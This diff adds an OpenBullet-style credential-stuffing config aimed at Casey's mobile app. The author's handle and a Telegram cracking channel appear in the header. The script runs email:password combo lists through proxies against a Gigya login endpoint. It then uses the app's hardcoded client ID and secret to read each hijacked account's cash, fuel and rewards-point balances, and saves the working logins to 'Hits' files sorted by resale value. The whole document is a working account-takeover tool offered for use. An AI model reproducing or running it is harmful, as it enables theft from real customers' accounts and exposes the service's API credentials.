@@ -1,0 +1,222 @@
+[SETTINGS]
+{
+  "Name": "Casey's(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-08T03:03:29.5766987+01:00",
+  "AdditionalInfo": "https://t.me/wolfcrack",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var UUID = uuidv4()
+END SCRIPT -> VARS "UUID"
+BEGIN SCRIPT JavaScript
+function uuidv4() {
+  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+    var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+    return v.toString(16);
+  });
+}
+var UUID2 = uuidv4()
+END SCRIPT -> VARS "UUID2"
+
+FUNCTION HMAC MD5 "" HmacBase64=TRUE "<UUID2>" -> VAR "UUID2" 
+
+FUNCTION HMAC SHA1 "" HmacBase64=TRUE "<UUID>" -> VAR "UUID" 
+
+FUNCTION URLEncode "<UUID>" -> VAR "UUID" 
+
+FUNCTION URLEncode "<UUID2>" -> VAR "UUID2" 
+
+REQUEST POST "https://accounts.us1.gigya.com/accounts.login" 
+  CONTENT "apikey=3_OFr4vtg_Bd96kSUSzSVoxDzFeJ1P64fc157RHIoiHIGKP3YyGUf8Kaak-3GkvqTH&format=json&gmid=<UUID>&httpStatusCodes=false&include=profile,data,emails,subscriptions,preferences,&includeUserInfo=true&lang=en&loginID=<USER>&loginMode=standard&password=<PASS>&sdk=ios_swift_1.0.10&sessionExpiration=1800&source=showScreenSet&targetEnv=mobile&ucid=<UUID2>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: accounts.us1.gigya.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Caseys/25 CFNetwork/1128.0.1 Darwin/19.6.0" 
+  HEADER "Accept-Language: */*" 
+  HEADER "Content-Length: 441" 
+  HEADER "Accept-Encoding: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid loginID or password" 
+    KEY "Account temporarily locked out" 
+  KEYCHAIN Success OR 
+    KEY "phoneNumber\": " 
+  KEYCHAIN Retry OR 
+    KEY "rate limit" 
+
+PARSE "<SOURCE>" LR "UID\": \"" "\"" -> VAR "UID" 
+
+PARSE "<SOURCE>" LR "\"UIDSignature\": \"" "\"" -> VAR "UIDSIGN" 
+
+PARSE "<SOURCE>" LR "signatureTimestamp\": \"" "\"" -> VAR "timestamp" 
+
+REQUEST POST "https://api.caseys.io/caseys-ea-mobileuser-api/caseyscommercewebservices/v2/caseys/user/login?channelType=MOBILE" 
+  CONTENT "{\"username\":\"<UID>\",\"signatureTimestamp\":\"<timestamp>\",\"UIDSignature\":\"<UIDSIGN>\",\"site\":\"caseys\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: api.caseys.io" 
+  HEADER "Accept: */*" 
+  HEADER "version: vlcp1" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "platform_version: iOS_v1.9" 
+  HEADER "Accept-Language: it-it" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Content-Length: 144" 
+  HEADER "User-Agent: Caseys/25 CFNetwork/1128.0.1 Darwin/19.6.0" 
+  HEADER "client_id: f7497476594d406e9dff22adb85d325d" 
+  HEADER "client_secret: 290Fd2473b4741d0b21C1862AfD0273E" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Caseys-AppInstanceId: 4FDEA073-529D-4800-9EF3-ECDB629BE2A5" 
+
+PARSE "<SOURCE>" LR "access_token\" : \"" "\"" -> VAR "auth" 
+
+REQUEST GET "https://api.caseys.io/caseys-ea-mobileuser-api/caseyscommercewebservices/v2/caseys/users/current?channelType=MOBILE" 
+  
+  HEADER "Host: api.caseys.io" 
+  HEADER "Accept: */*" 
+  HEADER "version: vlcp1" 
+  HEADER "Authorization: Bearer <auth>" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "platform_version: iOS_v1.9" 
+  HEADER "If-None-Match: \"0064352d636ae3321f8b1b72f6a7139e9-gzip\"" 
+  HEADER "Accept-Language: it-it" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Caseys/25 CFNetwork/1128.0.1 Darwin/19.6.0" 
+  HEADER "client_id: f7497476594d406e9dff22adb85d325d" 
+  HEADER "client_secret: 290Fd2473b4741d0b21C1862AfD0273E" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Caseys-AppInstanceId: 4FDEA073-529D-4800-9EF3-ECDB629BE2A5" 
+
+PARSE "<SOURCE>" LR "customerMasterNumber\" : \"" "\"" -> VAR "token1" 
+
+REQUEST GET "https://api.caseys.io/caseys-ea-mobileuser-api/api/mobile/account/summary" 
+  
+  HEADER "Host: api.caseys.io" 
+  HEADER "Accept: */*" 
+  HEADER "version: vlcp1" 
+  HEADER "Authorization: Bearer <auth>" 
+  HEADER "Accept-Language: it-it" 
+  HEADER "platform_version: iOS_v1.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "token: <token1>" 
+  HEADER "Content-Type: application/json" 
+  HEADER "User-Agent: Caseys/25 CFNetwork/1128.0.1 Darwin/19.6.0" 
+  HEADER "client_id: f7497476594d406e9dff22adb85d325d" 
+  HEADER "client_secret: 290Fd2473b4741d0b21C1862AfD0273E" 
+  HEADER "Connection: keep-alive" 
+  HEADER "X-Caseys-AppInstanceId: 4FDEA073-529D-4800-9EF3-ECDB629BE2A5" 
+
+PARSE "<SOURCE>" LR "\"Casey Cash\"," "}," -> VAR "Cash" "$" "" 
+
+PARSE "<SOURCE>" LR "name\": \"Fuel\"," "}," -> VAR "Fuel" "$" "" 
+
+PARSE "<SOURCE>" LR "\"pointBalance\": " "," CreateEmpty=FALSE -> CAP "Points" 
+
+FUNCTION Replace "\"balance\": \"" "" "<Cash>" -> VAR "Cash" 
+
+FUNCTION Replace "\"balance\": \"" "" "<Fuel>" -> VAR "Fuel" 
+
+FUNCTION Replace "\"" "" "<Fuel>" -> CAP "Fuel" 
+
+FUNCTION Replace "\"" "" "<Cash>" -> CAP "Cash" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<Points>" LessThan "1250" 
+
+IF "<Points>" GreaterThan "1249"
+IF "<Points>" LessThan "2500"
+
+UTILITY File "Hits\\Casey\\1250-2499 5-10$.txt" AppendLines "<USER>:<PASS> | Points : <Points>" 
+
+ENDIF
+IF "<Points>" GreaterThan "2499"
+IF "<Points>" LessThan "5000"
+
+UTILITY File "Hits\\Casey\\2500-4999 10-19$.txt" AppendLines "<USER>:<PASS> | Points : <Points>" 
+
+ENDIF
+IF "<Points>" GreaterThan "4999"
+IF "<Points>" LessThan "7500"
+
+UTILITY File "Hits\\Casey\\5000-7499 20-29$.txt" AppendLines "<USER>:<PASS> | Points : <Points>" 
+
+ENDIF
+IF "<Points>" GreaterThan "7499"
+IF "<Points>" LessThan "10000"
+
+UTILITY File "Hits\\Casey\\7500-9999 30-39$.txt" AppendLines "<USER>:<PASS> | Points : <Points>" 
+
+ENDIF
+IF "<Points>" GreaterThan "9999"
+IF "<Points>" LessThan "12500"
+
+UTILITY File "Hits\\Casey\\10000-12499 40-49$.txt" AppendLines "<USER>:<PASS> | Points : <Points>" 
+
+ENDIF
+IF "<Points>" GreaterThan "12499"
+IF "<Points>" LessThan "20000"
+
+UTILITY File "Hits\\Casey\\12500-19999 50-79$.txt" AppendLines "<USER>:<PASS> | Points : <Points>" 
+
+ENDIF
+IF "<Points>" GreaterThan "19999"
+
+UTILITY File "Hits\\Casey\\20000+ 80$.txt" AppendLines "<USER>:<PASS> | Points : <Points>" 
+
+ENDIF
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
